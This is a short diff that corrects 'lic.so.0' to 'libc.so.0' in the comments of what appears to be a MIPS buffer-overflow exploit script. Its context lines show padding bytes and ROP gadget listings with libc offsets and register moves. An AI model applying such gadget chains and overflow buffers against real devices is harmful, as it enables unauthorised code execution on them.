@@ -13,7 +13,7 @@ bug +=  'B' * 12
 """
 ROP Gadget 2
 -------------
-lic.so.0 - 0x00038800
+libc.so.0 - 0x00038800
 
 move $t9, $s2 
 lw $ra, 0x28($sp)
@@ -45,7 +45,7 @@ bug +=  'D' * 32
 """
 ROP Gadget 4
 -------------
-lic.so.0 - 0x00032a6c
+libc.so.0 - 0x00032a6c
 
 move $t9, $a1
 addiu $a0, $a0, 0x38
